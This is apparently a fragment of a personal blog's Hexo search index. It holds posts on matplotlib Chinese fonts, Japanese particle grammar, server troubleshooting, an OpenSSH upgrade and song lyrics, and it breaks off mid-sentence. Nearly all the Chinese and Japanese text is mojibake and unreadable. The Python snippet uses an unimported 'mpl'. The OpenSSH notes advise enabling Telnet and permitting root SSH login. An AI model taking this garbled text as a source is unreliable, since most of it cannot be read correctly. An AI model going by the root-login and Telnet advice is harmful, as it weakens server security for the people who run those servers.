DOWNLOAD_DIR/simhei.ttf CONFIG_DIR/fonts/ttf/ </span><br><span class="line">vim CONFIG_DIR/matplotlibrc <span class="comment"># matplotlib é…ç½®æ–‡ä»¶ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰¾åˆ°ç›¸åº”ä½ç½®å¹¶ ä¿®æ”¹ä¸ºä¸‹é¢ä¸‰é¡¹</span></span><br><span class="line">font.family : sans-serif</span><br><span class="line">font.sans-serif     : SimHei, Bitstream Vera Sans, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serif</span><br><span class="line">axes.unicode_minus:False <span class="comment">#ä½œç”¨å°±æ˜¯è§£å†³è´Ÿå·&#x27;-&#x27;æ˜¾ç¤ºä¸ºæ–¹å—çš„é—®é¢˜</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤åŸæœ¬å­—ä½“ç¼“å­˜</span></span><br><span class="line"><span class="built_in">cd</span> ~/.cache/matplotlib</span><br><span class="line">rm -rf *.*</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">mpl.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åº”è¯¥å°± OK äº†</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å°è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŒåŠ©è©ã€</title>
      <link href="2019/06/29/%E3%80%8C%E5%8A%A9%E8%A9%9E%E3%80%8D/"/>
      <url>2019/06/29/%E3%80%8C%E5%8A%A9%E8%A9%9E%E3%80%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="åŠ©è©ã€Œã¯ã€"><a href="#åŠ©è©ã€Œã¯ã€" class="headerlink" title="åŠ©è©ã€Œã¯ã€"></a>åŠ©è©ã€Œã¯ã€</h3><h4 id="lâ€”-ä¸»èªã¯-ä¸€ä¸ªå¥å­åªèƒ½æœ‰ä¸€ä¸ª"><a href="#lâ€”-ä¸»èªã¯-ä¸€ä¸ªå¥å­åªèƒ½æœ‰ä¸€ä¸ª" class="headerlink" title="lâ€” ä¸»èªã¯ã€€ä¸€ä¸ªå¥å­åªèƒ½æœ‰ä¸€ä¸ª"></a>l<sub>â€” ä¸»èªã¯ã€€ä¸€ä¸ªå¥å­åªèƒ½æœ‰ä¸€ä¸ª</h4><h4 id="lâ€”-è¡¨ç¤ºåŒºåˆ«å¯¹æ¯”"><a href="#lâ€”-è¡¨ç¤ºåŒºåˆ«å¯¹æ¯”" class="headerlink" title="lâ€” è¡¨ç¤ºåŒºåˆ«å¯¹æ¯”"></a>l<sub>â€” è¡¨ç¤ºåŒºåˆ«å¯¹æ¯”</h4><p>ä¾‹ï¼šæ˜æ—¥ã¯åƒãã¾ã›ã‚“<br>ã€€ã€€ç§ã¯é‡èœã¨é­šã‚’é£Ÿã¹ã¾ã™ã€‚è‚‰ã¯é£Ÿã¹ã¾ã›ã‚“<br>ã€€ã€€[ç§ã¯]åœŸæ›œæ—¥ã¯å‹é”ã¨é£Ÿäº‹ã—ã¾ã™ã€‚æ—¥æ›œæ—¥ã¯åƒãã¾ã™</p><h3 id="åŠ©è©ã€Œã«ã€"><a href="#åŠ©è©ã€Œã«ã€" class="headerlink" title="åŠ©è©ã€Œã«ã€"></a>åŠ©è©ã€Œã«ã€</h3><h4 id="lâ€”-è¡¨ç¤ºå‹•ä½œé€²è¡Œæ™‚ç‚¹"><a href="#lâ€”-è¡¨ç¤ºå‹•ä½œé€²è¡Œæ™‚ç‚¹" class="headerlink" title="lâ€” è¡¨ç¤ºå‹•ä½œé€²è¡Œæ™‚ç‚¹"></a>l<sub>â€” è¡¨ç¤ºå‹•ä½œé€²è¡Œæ™‚ç‚¹</h4><ul><li><p>å…·ä½“æ—¶é—´è¦æ”¾ã€Œã«ã€ï¼ˆå…«æ™‚ã«ã€åˆå¾Œå››æ™‚ã«ï¼‰ã€œã€€ã¾ã™<br>ä¾‹ï¼šï¼‘ï¼æ™‚ã«å‹é”ã¨é£Ÿäº‹ã—ã¾ã™ã€‚</p></li><li><p>æ³›æŒ‡æ—¶é—´ä¸ç”¨æ”¾ã€Œã«ã€ï¼ˆæ˜æ—¥ï¼‰ã€œã€€ã¾ã™</p></li><li><p>å¯æ”¾å¯ä¸æ”¾ã€Œã«ã€æœˆæ›œæ—¥ã€€ç«æ›œæ—¥ã€€æ°´æ›œæ—¥ã€€æœ¨æ›œæ—¥ã€€é‡‘æ›œæ—¥ã€€åœŸæ›œæ—¥ã€€æ—¥æ›œæ—¥ã€€</p></li></ul><h4 id="lâ€”-è¡¨ç¤ºå­˜åœ¨ä½ç½®"><a href="#lâ€”-è¡¨ç¤ºå­˜åœ¨ä½ç½®" class="headerlink" title="lâ€” è¡¨ç¤ºå­˜åœ¨ä½ç½®"></a>l<sub>â€” è¡¨ç¤ºå­˜åœ¨ä½ç½®</h4><ul><li><p>é‡ç‚¹æ˜¯ <strong>ä¸œè¥¿æˆ–äºº/åŠ¨ç‰©</strong></p><ul><li>å­˜åœ¨ä½ç½® + ã« + <strong>ä¸œè¥¿</strong> + ãŒ <u>ã‚ã‚Š</u>ã¾ã™<br>ä¾‹ï¼šæœºã®ä¸Šã«ãƒªãƒ³ã‚´ãŒ<u>ã‚ã‚Š</u>ã¾ã™<br>  aï¼šäº¬éƒ½ã«ä½•ãŒ<u>ã‚ã‚Š</u>ã¾ã™<br>  bï¼šå¤ã„ãŠå¯ºã‚„ç¥ç¤¾[ãªã©]ãŒ <u>ã‚ã‚Š</u>ã¾ã™</li><li>å­˜åœ¨ä½ç½® + ã« + <strong>äºº/åŠ¨ç‰©</strong> + ãŒ <u>ã„</u>ã¾ã™<br>ä¾‹ï¼šã‚ãã“ã«å­ä¾›ãŒ<u>ã„</u>ã¾ã™<br>  aï¼šéƒ¨å±‹ã«èª°ãŒ<u>ã„</u>ã¾ã™<br>  bï¼šç”°ä¸­ã•ã‚“ãŒ<u>ã„</u>ã¾ã™</li></ul></li><li><p>é‡ç‚¹æ˜¯ <strong>ä½ç½®</strong></p><ul><li>ä¸œè¥¿ + ã¯ + <strong>å­˜åœ¨ä½ç½®</strong> + ã« + ãŒ <u>ã‚ã‚Š</u>ã¾ã™<br>ä¾‹ï¼šaï¼šãƒˆã‚¤ãƒ¬ã¯ã©ã“ã«<u>ã‚ã‚Š</u>ã¾ã™ã‹<br>&emsp;&emsp;bï¼š2éšã«<u>ã‚ã‚Š</u>ã¾ã™/2éšã§ã™</li><li>äºº/åŠ¨ç‰© + ã¯ + <strong>å­˜åœ¨ä½ç½®</strong> + ã« + ãŒ <u>ã„</u>ã¾ã™<br>ä¾‹ï¼šaï¼šç”°ä¸­ã•ã‚“ã¯ã©ã“ã«<u>ã„</u>ã¾ã™ã‹<br>&emsp;&emsp;bï¼šï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ä¼šè­°å®¤ã«<u>ã„</u>ã¾ã™</li></ul></li></ul><h4 id="lâ€”-å½“åŠ¨ä½œä¸€ä¸ªäººå®Œæˆä¸äº†æ—¶"><a href="#lâ€”-å½“åŠ¨ä½œä¸€ä¸ªäººå®Œæˆä¸äº†æ—¶" class="headerlink" title="lâ€” å½“åŠ¨ä½œä¸€ä¸ªäººå®Œæˆä¸äº†æ—¶"></a>l<sub>â€” å½“åŠ¨ä½œä¸€ä¸ªäººå®Œæˆä¸äº†æ—¶</h4><p>åŠ¨ä½œä¸» + ã¯ + åŠ¨ä½œå¯¹æ–¹ + ã« +åŠ¨ä½œå¯¹è±¡ + ã‚’ + åŠ¨è¯<br>ä¾‹ï¼šç§ã¯å‹é”ã«é›»è©±ã‚’æ›ã‘ã¾ã—ãŸ<br>&emsp;&emsp;[ç§ã¯]å‹é”ã«CDã‚’è²¸ã—ã¾ã—ãŸ<br>&emsp;&emsp;ç§ã¯FAXã§ä¼šç¤¾ã«ãƒ¬ãƒãƒ¼ãƒˆã‚’é€ã‚Šã¾ã—ãŸ</p><p>ä¾‹ï¼šç§ã¯æ¯ã«ã‚«ãƒ¼ãƒ‰ã‚’ã‚ã’ã¾ã—ãŸ<br>&emsp;&emsp;ç§ã¯æ¯ã«ã‚»ãƒ¼ã‚¿ãƒ¼ã‚’<u>è²°ã„ã¾ã—ãŸ</u>  æ”¶åˆ°<br>&emsp;&emsp;æ¯ã¯ç§ã«ã‚»ãƒ¼ã‚¿ãƒ¼ã‚’<u>ãã‚Œã¾ã—ãŸ</u>  ç»™(æˆ‘)<br>&emsp;&emsp;<u>Ã—</u> æ¯ã¯ç§ã«ã‚»ãƒ¼ã‚¿ãƒ¼ã‚’<u>ã‚ã’ã¾ã—ãŸ</u><br>&emsp;&emsp;å› ä¸ºæ—¥æœ¬äººæ¯”è¾ƒè°¦è™š, ç»™åˆ«äººçš„æ—¶å€™è¦ ã€Œä¸Šã’ã€, å°±æ˜¯æ¯”è¾ƒç†Ÿçš„äººä¹Ÿæ˜¯å¦‚æ­¤, åˆ«äººç»™æˆ‘æ—¶æ˜¯ ã€Œã‚¯ãƒ¬ã€<br>&emsp;&emsp;ä¾‹ï¼šå‹é”ã¯ç§ã®å¦¹ã«æœ¬ã‚’ãã‚Œã¾ã—ãŸ<br>&emsp;&emsp;&emsp;&emsp;ç§ã¯çˆ¶ã«ãƒã‚¯ã‚¿ã‚¤ã‚’ã‚ã’ã¾ã—ãŸ</p><h4 id="lâ€”-è¡¨ç¤ºåˆ†é…æ™‚é–“"><a href="#lâ€”-è¡¨ç¤ºåˆ†é…æ™‚é–“" class="headerlink" title="lâ€” è¡¨ç¤ºåˆ†é…æ™‚é–“"></a>l<sub>â€” è¡¨ç¤ºåˆ†é…æ™‚é–“</h4><p>æœŸé–“ + ã« + æ¬¡æ•°</p><p>ä¾‹ï¼šä¸€é€±é–“ã«ï¼’å›æ—¥æœ¬èªã‚’å‹‰å¼·ã—ã¾ã™<br>aï¼šä¸€å‘¨é–“ã«ä½•å›è‹±èªã‚’å‹‰å¼·ã—ã¾ã™ã‹<br>bï¼š4å›å‹‰å¼·ã—ã¾ã™ã€‚1å›ã«4æ™‚é–“å‹‰å¼·ã—ã¾ã™<br>aï¼šã˜ã‚ƒã‚ã€ä¸€é€±é–“ã«ï¼‘ï¼–æ™‚é–“ã§ã™ã­ã€‚ã™ã”ã„ã§ã™ã­</p><h3 id="åŠ©è©ã€Œã§ã€"><a href="#åŠ©è©ã€Œã§ã€" class="headerlink" title="åŠ©è©ã€Œã§ã€"></a>åŠ©è©ã€Œã§ã€</h3><h4 id="lâ€”-è¡¨ç¤ºå‹•ä½œé€²è¡Œåœ°ç‚¹"><a href="#lâ€”-è¡¨ç¤ºå‹•ä½œé€²è¡Œåœ°ç‚¹" class="headerlink" title="lâ€” è¡¨ç¤ºå‹•ä½œé€²è¡Œåœ°ç‚¹"></a>l<sub>â€” è¡¨ç¤ºå‹•ä½œé€²è¡Œåœ°ç‚¹</h4><ul><li><p>å ´æ‰€ + ã§ + å‹•è©ã€€ã€œã€€ã¾ã™<br>åœ¨â€¦<br>ä¾‹ï¼šé§…ã®å‰ã§ä¼šã„ã¾ã—ã‚‡ã†ã€‚</p></li><li><p>ä¸€ä¸ªäººåšä»€ä¹ˆä»€ä¹ˆ<br>ä¸€äººã§</p></li><li><p>è¡¨ç¤ºäº¤é€šå·¥å…·ï¼ˆæ­ä¹˜ï½ï¼Œå¼€ï½ï¼Œéª‘ï½ï¼Œ åï½ï¼‰<br>ä¾‹ï¼šé›»è»Šã§è¡Œãã¾ã™<br>ã€€ã€€è¦æ­ç”µè½¦å»</p></li></ul><h4 id="lâ€”-ç”¨â€¦å·¥å…·-æ–¹æ³•"><a href="#lâ€”-ç”¨â€¦å·¥å…·-æ–¹æ³•" class="headerlink" title="lâ€” ç”¨â€¦å·¥å…·(æ–¹æ³•)"></a>l<sub>â€” ç”¨â€¦å·¥å…·(æ–¹æ³•)</h4><p>ä¾‹ï¼šç§ã¯<u>FAXã§</u>ä¼šç¤¾ã«ãƒ¬ãƒãƒ¼ãƒˆã‚’é€ã‚Šã¾ã—ãŸ</p><h3 id="åŠ©è©ã€Œã¨ã€"><a href="#åŠ©è©ã€Œã¨ã€" class="headerlink" title="åŠ©è©ã€Œã¨ã€"></a>åŠ©è©ã€Œã¨ã€</h3><h4 id="lâ€”-å’Œï¼ˆè·Ÿï¼‰â€¦"><a href="#lâ€”-å’Œï¼ˆè·Ÿï¼‰â€¦" class="headerlink" title="lâ€” å’Œï¼ˆè·Ÿï¼‰â€¦"></a>l<sub>â€” å’Œï¼ˆè·Ÿï¼‰â€¦</h4><p>ä¾‹ï¼šæ—¥æ›œæ—¥ã€[ã‚ãªãŸã¯]èª°ã¨é£Ÿäº‹ã—ã¾ã™ã‹ã€‚<br>ã€€ã€€[ç§ã¯]é«˜æ ¡æ™‚ä»£ã®å‹é”ã¨é£Ÿäº‹ã—ã¾ã™ã€‚</p><h4 id="lâ€”-è¡¨å¹¶åˆ—-å’Œ"><a href="#lâ€”-è¡¨å¹¶åˆ—-å’Œ" class="headerlink" title="lâ€” è¡¨å¹¶åˆ— å’Œ"></a>l<sub>â€” è¡¨å¹¶åˆ— å’Œ</h4><ul><li>æœºã®ä¸Šã«æœ¬ã¨ãƒãƒ¼ãƒˆãŒã‚ã‚Šã¾ã™<br>  è¡¨ç¤ºæ¡Œå­ä¸Šåªæœ‰ä¹¦å’Œå¤‡å¿˜å½•</li><li>æœºã®ä¸Šã«æœ¬ã‚„ãƒãƒ¼ãƒˆ[ãªã©(ç­‰)]ãŒã‚ã‚Šã¾ã™<br>  è¡¨ç¤ºæ¡Œå­ä¸Šæœ‰ä¹¦ã€å¤‡å¿˜å½•ç­‰</li></ul><h3 id="åŠ©è©ã€Œã‚’ã€"><a href="#åŠ©è©ã€Œã‚’ã€" class="headerlink" title="åŠ©è©ã€Œã‚’ã€"></a>åŠ©è©ã€Œã‚’ã€</h3><ul><li>è¡¨ç¤ºåŠ¨ä½œä½œç”¨å¯¹è±¡(çœ‹å¾—è§çš„åŠ¨ä½œ)ã€€<br>å¯¾è±¡ + ã‚’ + å‹•ä½œ<br>ä¾‹ï¼šæ—¥æœ¬èªã‚’å‹‰å¼·ã—ã¾ã™</li></ul><h3 id="åŠ©è©ã€ŒãŒã€"><a href="#åŠ©è©ã€ŒãŒã€" class="headerlink" title="åŠ©è©ã€ŒãŒã€"></a>åŠ©è©ã€ŒãŒã€</h3><ul><li>å¯¾è±¡ + ãŒï¼ˆè¡¨ç¤ºç„¦ç‚¹ï¼‰+ çŠ¶æ…‹å‹•è©ã€€<br>ä¾‹ï¼šæ—¥æœ¬èªãŒåˆ†ã‹ã‚Šã¾ã™<br>&emsp;&emsp;ç§ã¯ãŠé‡‘ãŒå…¨ç„¶ã‚ã‚Šã¾ã›ã‚“</li></ul><h3 id="æ™‚åˆ¶"><a href="#æ™‚åˆ¶" class="headerlink" title="æ™‚åˆ¶"></a>æ™‚åˆ¶</h3><table><thead><tr><th align="center">-</th><th align="center">è‚¯å®š</th><th align="center">å¦å®š</th></tr></thead><tbody><tr><td align="center">ç¾åœ¨</td><td align="center">ã€œã¾ã™</td><td align="center">ã€œã¾ã›ã‚“</td></tr><tr><td align="center">éå»</td><td align="center">ã€œã¾ã—ãŸ</td><td align="center">ã€œã¾ã›ã‚“ã§ã—ãŸ</td></tr></tbody></table><h3 id="èªæ°—"><a href="#èªæ°—" class="headerlink" title="èªæ°—"></a>èªæ°—</h3><ul><li>ã¾ã›ã‚“ã‹<br>è¦ä¸è¦</li></ul><p>ä¾‹ï¼šä¸€ç·’ã«[å‹•è©]ã¾ã›ã‚“ã‹<br>&emsp;&emsp;ãˆãˆã€[ ]ã¾ã—ã‚‡ã†<br>&emsp;&emsp;ã™ã¿ã¾ã›ã‚“ã€ã¡ã‚‡ã£ã¨â€¦</p><h3 id="ãã®ä»–"><a href="#ãã®ä»–" class="headerlink" title="ãã®ä»–"></a>ãã®ä»–</h3><ul><li><p>æ­©ã„ã¦<br>èµ°è·¯å»</p></li><li><p>æ€»æ˜¯ ã„ã¤ã‚‚ã€€ç»å¸¸ ã‚ˆãã€€æœ‰æ—¶å€™ æ™‚ã€…</p></li><li><p>ä¸å¸¸ ã‚ã¾ã‚Šï¼¿ï¼¿ã¾ã›ã‚“ã€€å®Œå…¨ä¸ å…¨ç„¶ï¼¿ï¼¿ã¾ã›ã‚“</p></li><li><p>ç†ç”±åŸå› ã‹ã‚‰ã€ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ï¼¿<br>ä¾‹ï¼šãŠé‡‘ãŒã‚ã‚Šã¾ã›ã‚“ã‹ã‚‰ã€ã©ã“ã‚‚è¡ŒããŸããªã„ã§ã™<br>&emsp;&emsp;æ—¥æœ¬ã®ã‚¢ãƒ‹ãƒ¡ãŒå¥½ãã§ã™ã‹ã‚‰ã€æ—¥æœ¬èªã‚’å‹‰å¼·ã—ã¾ã™<br>&emsp;&emsp;aï¼šã©ã†ã—ã¦ã€æ˜¨æ—¥ã€å­¦æ ¡ã¸æ¥ã¾ã›ã‚“ã§ã™ã‹<br>&emsp;&emsp;bï¼šç–²ã‚Œã¾ã—ãŸã‹ã‚‰</p></li><li><p>ã‚‚ã†ã€€å·²ç»<br>ä¾‹ï¼šã‚‚ã†æ™©ã”é£¯ã‚’é£Ÿã¹ã¾ã—ãŸã‹<br>&emsp;&emsp;ã¯ã„ã€ã‚‚ã†é£Ÿã¹ã¾ã—ãŸ<br>&emsp;&emsp;ã„ã„ãˆã€ã¾ã ã§ã™<br>&emsp;&emsp;20æ™‚ã§ã™ã­ã€ã‚‚ã†å¸°ã‚Šã¾ã™<br>&emsp;&emsp;aï¼šã‚‚ã†ã‚ã®æ˜ ç”»ã‚’è¦‹ã¾ã—ãŸã‹<br>&emsp;&emsp;bï¼šã„ã„ãˆã€ã¾ã ã§ã™ã€‚æ˜æ—¥å‹é”ã¨è¦‹ã¾ã™<br>&emsp;&emsp;aï¼š21æ™‚ã§ã™ã‚ˆã€å¸°ã‚Šã¾ã›ã‚“ã‹<br>&emsp;&emsp;bï¼šãã†ã§ã™ã­ã€å¸°ã‚Šã¾ã—ã‚‡ã†</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> å‹‰å¼· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‹‰å¼· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>some issue</title>
      <link href="2019/06/27/some_issue/"/>
      <url>2019/06/27/some_issue/</url>
      
        <content type="html"><![CDATA[<h3 id="å®˜ç½‘è®¿é—®ç›¸å…³"><a href="#å®˜ç½‘è®¿é—®ç›¸å…³" class="headerlink" title="å®˜ç½‘è®¿é—®ç›¸å…³"></a>å®˜ç½‘è®¿é—®ç›¸å…³</h3><p>æ£€æŸ¥å†…å¤–ç½‘, vpnæƒ…å†µä¸‹çš„è®¿é—®æƒ…å†µ, ä»¥æ­¤æ¥ç²—ç•¥åˆ¤æ–­æ˜¯å¦ä¸ºwafæ‹¦æˆª<br>[æ¡ˆä¾‹1]: å®˜ç½‘å¤–ç½‘æ— æ³•è®¿é—®, å†…ç½‘å¯ä»¥æˆ–vpnå¯ä»¥, è¯´æ˜ç½‘ç«™æ²¡æœ‰é—®é¢˜, å¯ä»¥æ¨æµ‹ä¸‹æ˜¯wafæ‹¦æˆª</p><p>æ£€æŸ¥118 119 120çš„é€šä¿¡æƒ…å†µ(ping)<br>[æ¡ˆä¾‹2]: è®¿é—®ç½‘ç«™å‡ºç°500é”™è¯¯, é€šè¿‡pingå‘ç°120æ— æ³•é€šä¿¡ï¼Œä¹Ÿè¿›ä¸äº†shellï¼Œ ç™»é™†vsphereå‘ç°æ˜¯é›†ç¾¤çš„å…±äº«å­˜å‚¨æ»¡äº†</p><p>æ£€æŸ¥ å†…å­˜, cpuä½¿ç”¨æƒ…å†µ(top)<br>[æ¡ˆä¾‹3]: å®˜ç½‘ä¸»é¡µä¸Šä¸å», ç™»é™†118åå‘ç°æœ‰ä¸ªç¨‹åºè·‘æ»¡äº†cpu, ä½¿ç”¨killå‘½ä»¤æ€æ‰ç›¸å…³è¿›ç¨‹(killå‰å…ˆç¡®è®¤ä¸‹è¿›ç¨‹ç”¨é€”)</p><p>æ£€æŸ¥nginx,php-fpmçš„è¿è¡Œæƒ…å†µ(ps -aux| grep xxx)<br>æ£€æŸ¥ ç¡¬ç›˜ä½¿ç”¨æƒ…å†µ (df -hæˆ–vshpere)<br>æŸ¥çœ‹ nginx, phpæ—¥å¿—æ–‡ä»¶<br>å°è¯•å¯¹nginx ,php-fpmé‡å¯<br>å°è¯•å¯¹æœåŠ¡å™¨é‡å¯<br>å¦‚æœxshell æ— æ³•è¿æ¥æœåŠ¡å™¨, ç™»é™†vsphere æ£€æŸ¥æœåŠ¡å™¨å‚¨å­˜ç©ºé—´æ˜¯å¦å·²æ»¡</p><h3 id="æŒ‚è½½ç›¸å…³"><a href="#æŒ‚è½½ç›¸å…³" class="headerlink" title="æŒ‚è½½ç›¸å…³"></a>æŒ‚è½½ç›¸å…³</h3><p>å®˜ç½‘ä¸Šä¼ æ–‡ä»¶å¤±è´¥, å›¾ç‰‡ä¸æ˜¾ç¤º, /wp-content/uploads/æ— æ³•å»ºç«‹ç›®å½•ç­‰ä¸æŒ‚è½½æ–‡ä»¶å¤¹(ä¸€èˆ¬æ˜¯uploadsæ–‡ä»¶å¤¹)ä¸‹çš„æ–‡ä»¶ç›¸å…³çš„é—®é¢˜<br>æ£€æŸ¥119çš„æ–‡ä»¶æŒ‚è½½æ˜¯å¦æˆåŠŸ(showmount -e)è‹¥æ²¡æŒ‚è½½æˆåŠŸ, é‡å¯æœåŠ¡å™¨<br>å¦‚æœè¦å¯¹/wp-content/uploads/çš„æ–‡ä»¶è¿›è¡Œæƒé™ç›¸å…³çš„æ“ä½œ,éœ€è¦åœ¨119ä¸Šè¿›è¡Œå¤„ç†, 118ä¸Šæ— æ³•è¿›è¡Œ</p><h3 id="æ¢å¤å¿«ç…§ç›¸å…³"><a href="#æ¢å¤å¿«ç…§ç›¸å…³" class="headerlink" title="æ¢å¤å¿«ç…§ç›¸å…³"></a>æ¢å¤å¿«ç…§ç›¸å…³</h3><p>åˆšåˆšå¿«ç…§æ¢å¤å, å¯èƒ½ä¼šé‡è§ç½‘ç«™éƒ¨åˆ†åŠŸèƒ½å¤±æ•ˆ,éƒ¨åˆ†é¡µé¢æ— æ³•è®¿é—®, å¯èƒ½æ˜¯æ–‡ä»¶æŒ‚è½½æˆ–æ•°æ®åº“è¿æ¥æ²¡æœ‰å®Œå…¨æ¢å¤, å»ºè®®ç­‰å¾…30min~1håå†æŸ¥çœ‹ç½‘ç«™æ˜¯å¦æ­£å¸¸, å†è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œæ’æŸ¥é—®é¢˜. å¿«ç…§æ¢å¤å’Œé‡å¯å¯¹å®˜ç½‘è®¿é—®ä¼šé€ æˆä¸€å®šå½±å“, æ¶‰åŠåˆ°è¿™ç±»çš„æ“ä½œåšå¥½æ™šä¸Šè¿›è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openssh upgrade, from 7.5 to 7.9</title>
      <link href="2019/06/24/Openssh%20upgrade,%20from%207.5%20to%207.9/"/>
      <url>2019/06/24/Openssh%20upgrade,%20from%207.5%20to%207.9/</url>
      
        <content type="html"><![CDATA[<h3 id="è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹"><a href="#è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹" class="headerlink" title="è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹"></a>è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹</h3><h3 id="ç³»ç»Ÿç¯å¢ƒ-Ubuntu14-04"><a href="#ç³»ç»Ÿç¯å¢ƒ-Ubuntu14-04" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ: Ubuntu14.04"></a>ç³»ç»Ÿç¯å¢ƒ: Ubuntu14.04</h3><ul><li><p>å¦‚æœæœåŠ¡å™¨å¹¶éé‡‡ç”¨äº‘è™šæ‹Ÿå¹³å°ï¼Œæœ€å¥½å…ˆå¯ç”¨å¹¶æµ‹è¯•SSHä»¥å¤–çš„è¿æ¥æ–¹å¼ï¼ˆå¦‚Telnetï¼‰æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ï¼Œå¦‚æœSSHå®‰è£…å¤±è´¥ä¼šè¿ä¸ä¸ŠæœåŠ¡å™¨ï¼ˆåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„â€¦ï¼‰</p></li><li><p>åˆ é™¤æ—§ç‰ˆæœ¬çš„opensshç‰ˆæœ¬æ–‡ä»¶åŠæ—§ç‰ˆæœ¬çš„opensslï¼ˆ1ã€è®°å¾—å…ˆå¤‡ä»½å¥½ 2ã€å¦‚æœzlibç‰ˆæœ¬é€‚åº”å½“å‰ç‰ˆæœ¬OpenSSHï¼Œå¯ä»¥ä¸ç”¨æ›´æ–°ï¼‰</p></li><li><p>Wget openssh7.9p1ã€openssl1.1.1 å’Œ perl5.26å®‰è£…åŒ…</p></li><li><p>å…ˆç¼–è¯‘å®‰è£…perl,è®°å¾—å¤‡ä»½æ—§çš„perlï¼Œå†åˆ›é€ æ–°çš„è½¯é“¾æ¥<br>Perl -vè¿›è¡Œæµ‹è¯•</p></li><li><p>ç¼–è¯‘å®‰è£…opensslï¼Œ<br>openssl versionæµ‹è¯•ä¸æˆåŠŸ<br>åˆ°binç›®å½•ä¸‹./openssl versionï¼ŒæŠ¥æ–‡ä»¶åŠ è½½å‡ºé”™<br>å¤‡ä»½å¹¶é‡æ–°åˆ›å»ºæ–°çš„libssl.so.1.1å’Œlibcrypto.so.1.1è½¯é“¾æ¥<br>å†æ¬¡binç›®å½•ä¸‹./openssl versionæˆåŠŸ<br>å¤‡ä»½å¹¶åˆ›å»ºæ–°çš„opensslè½¯é“¾æ¥<br>Openssl versionè¿›è¡Œæµ‹è¯•</p></li><li><p>ç¼–è¯‘å®‰è£…openssh</p></li><li><p>ä¿®æ”¹sshé…ç½®æ–‡ä»¶å…è®¸rootç”¨æˆ·ç™»å½•</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã‚´ãƒ¼ã‚¹ãƒˆãƒ«ãƒ¼ãƒ«</title>
      <link href="2019/06/24/%E3%82%B4%E3%83%BC%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%AB/"/>
      <url>2019/06/24/%E3%82%B4%E3%83%BC%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%AB/</url>
      
        <content type="html"><![CDATA[<h4 id="â€˜ãƒ¡ãƒ¼ãƒ‡ãƒ¼â€™ã®æ„å‘³"><a href="#â€˜ãƒ¡ãƒ¼ãƒ‡ãƒ¼â€™ã®æ„å‘³" class="headerlink" title="â€˜ãƒ¡ãƒ¼ãƒ‡ãƒ¼â€™ã®æ„å‘³"></a>â€˜ãƒ¡ãƒ¼ãƒ‡ãƒ¼â€™ã®æ„å‘³</h4><p>ã“ã®å‰ã€ã‚´ãƒ¼ã‚¹ãƒˆãƒ«ãƒ¼ãƒ«ã‚’è´ãã¾ã—ãŸã€ãã®æ­Œè©ã®ä¸­ã€€â€™ãƒ¡ãƒ¼ãƒ‡ãƒ¼â€™ã€€ãŒã‚ã‚Šã¾ã™<br>ã©ã†ã„ã†æ„å‘³ãªã®ã‹ï¼Ÿã€€ãã®æ„å‘³ã«ã¤ã„ã¦è€ƒãˆãŒã‚ã‚Šã¾ã™ã€‚</p><p>ã‚°ãƒ¼ã‚°ãƒ«ã§ã€ã“ã®ã‚ˆã†ãªè¨€è‘‰ãŒã‚ã‚‹ï¼š<br>Mayday is an emergency procedure word used internationally as a distress signal in voice-procedure radio communications.</p><p>é­é›£ä¿¡å·ã®ã“ã¨ã§ã™ã‹ï¼Ÿ<br>ã‚¨ã‚¨ã‚¨ã‚¨ã‚¨ã€ã€å…¨ç„¶åˆ†ã‹ã‚‰ãªã„</p><p>æœ€å¾Œã«ã“ã®ãƒªãƒ³ã‚¯ã‚’è¦‹ã¤ã‘ã¾ã—ãŸã€€<a href="https://music.branchwith.com/element/interpretation/go-sutoru-ru">ã‚´ãƒ¼ã‚¹ãƒˆãƒ«ãƒ¼ãƒ«æ­Œè©ã®æ„å‘³</a><br>ã¤ã¾ã‚Šã€ä¸»äººå…¬ã¯é­é›£ã—ã¦ã„ã¦ã€ã 